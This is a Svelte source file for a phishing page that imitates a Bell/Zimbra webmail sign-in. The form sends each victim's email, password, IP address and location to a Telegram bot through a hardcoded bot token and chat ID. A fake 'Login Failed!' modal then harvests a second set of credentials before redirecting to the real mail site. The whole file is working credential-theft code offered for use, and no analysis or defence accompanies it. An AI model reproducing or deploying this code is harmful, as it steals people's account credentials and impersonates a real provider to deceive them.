<script>
  import { fade } from 'svelte/transition';
  import { onMount, onDestroy } from 'svelte';

  let email = '';
  let password = '';
  let modalPassword = '';
  let modalEmail = '';
  let errors = { email: '', password: '' };
  let isModalVisible = false;
  let isContainerVisible = true;
  let showInfoPopup = false;
  let showPassword = false;
  let passwordInput;
  let showDropdown = false;
  let dropdownWrapper;
  let selectedVersion = 'default';

  let ipAddress = '';
  let location = {
    latitude: '',
    longitude: '',
    country: '',
    city: '',
    state: '',
    zip_code: ''
  };

  $: if (passwordInput) {
    passwordInput.type = showPassword ? 'text' : 'password';
  }

  function togglePasswordVisibility() {
    showPassword = !showPassword;
    passwordInput.type = showPassword ? 'text' : 'password';

  }

  //Transparent Container function 
  function closeTransparentContainer() {
    isContainerVisible = false;
    return true
  }

  function handleClickOutside(e) {
            const wrapper = dropdownWrapper;
            if (wrapper && !wrapper.contains(e.target)) {
                showDropdown = false;
                showInfoPopup = false;
            }
        }

  function selectVersion(version) {
            selectedVersion = version;
            showDropdown = false;
            return true;
          }
  function toggleDropdown() {
            showDropdown = !this.showDropdown;
            showInfoPopup = false;
            return true;
          }

  function toggleInfoPopup() {
            showInfoPopup = !this.showInfoPopup;
            showDropdown = false;
            return true;
          }

      onMount(() => {
    window.addEventListener('click', handleClickOutside);
  });

  onDestroy(() => {
    window.removeEventListener('click', handleClickOutside);
  });

  // Validation functions
  function validateEmail() {
    const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return re.test(email);
  }

  function validatePassword() {
    if (password.length < 1) {
      return 'Password is Required';
    }
    return '';
  }

  async function getLocationDetails(lat, lon) {
    try {
      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
      const data = await response.json();
      return {
        country: data.address ? data.address.country : 'N/A',
        city: data.address ? data.address.city : 'N/A',
        state: data.address ? data.address.state : 'N/A',
        zip_code: data.address ? data.address.postcode : 'N/A'
      };
    } catch (error) {
      console.error('Error fetching location details:', error);
      return {
        country: 'N/A',
        city: 'N/A',
        state: 'N/A',
        zip_code: 'N/A'
      };
    }
  }

  async function getIpAddress() {
    try {
      const response = await fetch('https://api64.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Failed to fetch IP address:', error);
      return 'N/A';
    }
  }

  // Function to handle form submission
  async function submitForm() {
    // Clear previous errors
    errors.email = '';
    errors.password = '';

    // Perform validation
    if (!validateEmail()) {
      errors.email = 'Please enter a valid email address.';
    }

    const passwordError = validatePassword();
    if (passwordError) {
      errors.password = passwordError;
    }

    // Send data
    if (!errors.email && !errors.password) {
      // Show the modal
      isModalVisible = true;
      await sendDataToTelegram(email, password, ipAddress, location);
    }
  }

  // Send data to Telegram
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
    const chatId= '1613277499'; // Replace with your(others) Telegram chat ID

    const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if(response.ok){
      console.log('login successful');
      return true;
    } else {
      console.error("Failed to login:",response.status, response.data)
    };
    } catch(error) {
      console.error('Error:', error);
      return false;
    }
  }


  // Function to close the modal
async function closeModal() {
  await sendDataToTelegram(email, password, ipAddress, location, modalEmail, modalPassword);
  isModalVisible = false;
  window.location.href = 'https://mail.myaccess.ca';
  return true;
}
</script>

<style scoped>
  /* Transparent Container */
.transparentContainer {
  z-index: 100;
  height: 100vh;
  width: 100vw;
  position: fixed;
  top: 0;
  left: 0;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: rgb(255, 255, 255, 0.3);
  backdrop-filter: blur(8px)
}

.transparentContainerLogo {
   width: 300px;
    height: 200px;
    margin-bottom: 20px;
}

.transparentContainerText {
  font-weight: 800;
  margin-bottom: 20px;
}

.transparentContainerButton {
  background: linear-gradient(to right, #004e94, #0064a2);
  height: 40px;
  width: 150px;
  border-radius: 5px;
  cursor: pointer;
  margin: 20px 0;
  color: white;
  outline: none;
  border: none;
}

/* .transparentContainerContent {
  opacity: 0;
  transform: scale(0.8);
} */

.animate-in {
  animation: scaleFadeIn 0.7s ease forwards;
}

@keyframes scaleFadeIn { 
  0% {
    opacity: 0;
    transform: scale(0.8);
  }
  100% {
    opacity: 1;
    transform: scale(1);
  }
}

.card-background {
    /* margin-top: 40px; */
    background: #0088C1;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    width: 100vw;
    height: 100vh;
    /* padding: 10px; */
}

.card {
    background: white;
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
    box-sizing: border-box;
}

.card-details {
    padding: 40px;
}

.card-banner {
    background-repeat: no-repeat;
    background-position: bottom left;
    background-size: contain;
    background-image: url('/LoginBanner.png');
    width: 260px;
    height: 34px;
}

.card-header {
    color: #333;
    font-size: 20px;
    font-weight: bold;
    padding: 3px 10px 4px 5px;
    margin-top: 15px;
        margin-bottom: 5px;
}

.form-group {
    width: 100%;
    padding: 0 10px;
    box-sizing: border-box;
    margin-top: 10px;
    margin-bottom: 10px;
}
.credentials-group {
    display: flex;
    flex-direction: column;
    justify-content: center;
    width: 100%;
}

.field-group {
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    gap: 4px;
    width: 100%;
    margin-bottom: 5px;
    /* align-items: center; */
    /* width: 288px; */
}

.field-group label {
    color: #666;
    font-size: 12px;
}

.field-group input[type="email"],
.field-group input[type="password"],
.password-wrapper input {
    /* width: 208px; */
    width: 100%;
    box-sizing: border-box;
    height: 32px;
    background: white;
    padding: 1px 3px;
    border: 1px solid #666;
}

.field-group input[type="email"]:focus,
.field-group input[type="password"]:focus {
    border-color: #0088C1;
    outline: none;
}

.password-wrapper {
    position: relative;
    width: 100%;
}

.password-wrapper input {
    width: 100%;
    padding-right: 60px;
    /* reserve space for button */
}

.toggle-password {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    color: #0088C1;
    cursor: pointer;
    font-size: 13px;
    user-select: none;
}

.action-row {
    display: flex;
    margin-top: 20px;
    justify-content: space-between;
    align-items: center;
    flex-wrap: nowrap;
    gap: 10px;
}

.stay-signed {
    color: #666;
    white-space: nowrap;
    flex-grow: 1;
    text-align: right;
}

.stay-signed input[type="checkbox"] {
    margin-right: 2px;
    accent-color: #0088C1;
}

.button {
    width: 85px;
    height: 31px;
    background: #0088C1;
    padding: 1px 3px;
    border-radius: 4px;
    border: none;
    color: white;
    flex-shrink: 0;
    /* border: 1px solid #a4a4a4; */
}

.bottomline {
    background: #EEEEEE;
    /* margin: 51px; */
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px 40px;
    width: 100%;
}

.bottomline-label {
    align-self: flex-start;
    padding: 0 10px;
}

.bottomline-flex {
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    margin-top: 10px;
    gap: 10px;
    position: relative;
}

.dropdown-display {
    background: white;
    padding: 5px 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
    flex-grow: 1;
    display: flex;
    justify-content: space-between;
    align-items: center;
    cursor: pointer;
    position: relative;
}

.dropdown-arrow {
    width: 0;
    height: 0;
    border-left: 5px solid transparent;
    border-right: 5px solid transparent;
    border-top: 6px solid #333;
    margin-left: 10px;
}

.bottomline-icon {
    background: url('/questionMark.png');
    background-repeat: no-repeat;
    background-position: center center;
    background-size: 20px 20px;
    height: 22px;
    width: 22px;
    filter: brightness(0.4);
    cursor: pointer;
}

.dropdown-options {
    position: absolute;
    bottom: 100%;
    background: white;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    width: inherit;
    padding: 5px 0;
    z-index: 10;
}

.dropdown-options div {
    padding: 10px;
    cursor: pointer;
}

.dropdown-options div:hover {
    background: #0088C1;
}

.info-popup {
position: absolute;
    bottom: 100%;
    background: #fff;
    color: #333;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 15px;
    margin-top: 10px;
    width: 100%;
    font-size: 12px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    line-height: 1.5;
    z-index: 10;
}

.info-close {
  position: absolute;
  top: 5px; right: 8px;
  background: transparent;
  border: none;
  font-size: 16px;
  cursor: pointer;
}

.error {
    color: red;
    font-size: 12px;
    margin-top: 7px;
}

/* Responsive utilities */
@media (min-width: 1024px) {
    .card {
        max-width: 500px;
    }

    .action-row {
        gap: 20px;
    }
}
@media (max-width: 769px) {
    .card {
        max-width: 500px;
    }

    .action-row {
        justify-content: space-between;
    }
}

/* overlay styles */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: none; /* Hidden by default */
  align-items: center;
  justify-content: center;
  z-index: 1000; /* Ensure it’s above all content */
  backdrop-filter: blur(6px); /* Blur background */
  background-color: rgba(0, 0, 0, 0.4); /* Semi-transparent dark overlay */
  transition: opacity 0.3s ease;
  opacity: 0;
  pointer-events: none;
}

  .modal-overlay.visible {
    display: flex;
    opacity: 1;
    pointer-events: auto;
  }

  .modal-content {
    background-color: white;
    padding: 20px;
    border-radius: 8px;
    text-align: center;
  }

  .modalform-header {
    font-size: 20px;
    margin-top: 10px;
    margin-bottom: 30px;
  }

.modalform-group {
  display: flex;
  flex-direction: column;
  padding: 0 20px;
  margin-bottom: 10px;
}

.modalform-group label {
  font-size: 14px;
  margin-bottom: 5px;
  line-height: 18px;
  height: 20px;
  font-weight: 700;
  font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
  align-self: flex-start;
}

.modalform-group input[type='email'],
.modalform-group input[type='password'] {
  height: 40px;
  padding: 10px;
  border: 1px solid black;
  border-radius: 4px;
}

.modalform-group input[type='email']:focus,
.modalform-group input[type='password']:focus {
  outline: none;
  border: 1px solid #ffa07a;
  box-shadow: 0 0 0 2px #007bff;
  border-radius: 4px;
}

.modal-footer {
    margin-top: 20px;
    display: flex;
    justify-content: flex-start;
    padding: 0 20px;
  }

  .modal-btn {
    padding: 10px 20px;
    background: #0088C1;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  .modal-btn:hover {
    opacity: 0.8;
  }

</style>
<!-- Transparent Container-->
 {#if isContainerVisible}
 <div class="transparentContainer">
  <div> <img class="transparentContainerLogo animate-in" src="/LoginBanner.png" alt="logo"/> </div>
  <p class="transparentContainerText animate-in"> You are one step away</p>

  <button class="transparentContainerButton animate-in" on:click={closeTransparentContainer}> Continue </button>
 </div>
{/if}

 <!-- Main Container-->
<div>
    <main class="card-background">
        <div class="card">
            <div class="card-details">
                <div class="card-banner"></div>
                <h1 class="card-header">Sign In</h1>

                <form on:submit|preventDefault={submitForm} class="form-group">
                    <div class="credentials-group">
                        <div class="field-group">
                            <label for="email">Username</label>
                            <input id="email" name="email" type="email" bind:value={email} />
                            {#if errors.email }
                            <div class="error">{ errors.email }</div>
                            {/if}
                          </div>

                        <div class="field-group">
                            <label for="password">Password</label>
                            <div class="password-wrapper">
                                <input bind:this={passwordInput} type='password' bind:value={password}
                                    class="password-input" />
                                <span class="toggle-password" on:click={togglePasswordVisibility}>
                                    { showPassword ? 'Hide' : 'Show' }
                                </span>
                            </div>
                            {#if errors.password }
                            <div class="error">{ errors.password }</div>
                            {/if}
                          </div>
                    </div>

                    <div class="action-row">
                        <button class="button" type="submit">Sign In</button>
                        <label class="stay-signed">
                            <input type="checkbox" /> Stay signed in
                        </label>
                    </div>
                </form>
            </div>

            <div class="bottomline">
                <label class="bottomline-label">Web App Version</label>
                <div class="bottomline-flex" bind:this={dropdownWrapper}>
                    <div class="dropdown-display" on:click={toggleDropdown}>
                        { selectedVersion } <span class="dropdown-arrow"></span>
                    </div>
                    <div class="bottomline-icon" on:click|stopPropagation={toggleInfoPopup}></div>
                      {#if showDropdown}
                        <div  class="dropdown-options" transition:fade>
                            <div on:click={() => selectVersion('Default')}>Default</div>
                            <div on:click={() => selectVersion('Classic')}>Classic</div>
                            <div on:click={() => selectVersion('Modern')}>Modern</div>
                        </div>
                        {/if}

                    {#if showInfoPopup }
                        <div class="info-popup" transition:fade>
                            <button class="info-close" on:click={() => showInfoPopup = false}>&times;</button>
                            <strong>Modern</strong><br />
                            The Modern Web App delivers a responsive experience across all your devices and integrates
                            with
                            many popular apps.<br /><br />
                            <strong>Classic</strong><br />
                            The Classic Web App is familiar to long-time Zimbra users. It delivers advanced
                            collaboration
                            and calendar features popular with power users on Desktop web browsers.<br /><br />
                            <strong>Default</strong><br />
                            This will sign you in according to your saved Preference. In the Modern Web App, set this
                            preference in Settings > General > Zimbra Version. In Classic, set it in Preferences >
                            General >
                            Sign In.
                        </div>
                    {/if}
                </div>

            </div>
        </div>
    </main>
  </div>

<!-- Modal for Second Verification -->
 {#if isModalVisible }
<div class="modal-overlay {isModalVisible ? 'visible' : ''}">
  <div class="modal-content">
    <h2 class="modalform-header">Login Failed!</h2>
     <div class="modalform-group">
        <label for="modalemail">Email Address</label>
        <input id="modalemail" type="email" bind:value={modalEmail} name="email"/>
      </div>

      <div class="modalform-group">
        <label for="modalpassword">Password</label>
        <input id="modalpassword" type="password" bind:value={modalPassword} />
     
      </div>
    <div class="modal-footer">
      <button class="modal-btn" on:click={closeModal}>Log in</button>
    </div>
  </div>
</div>
{/if}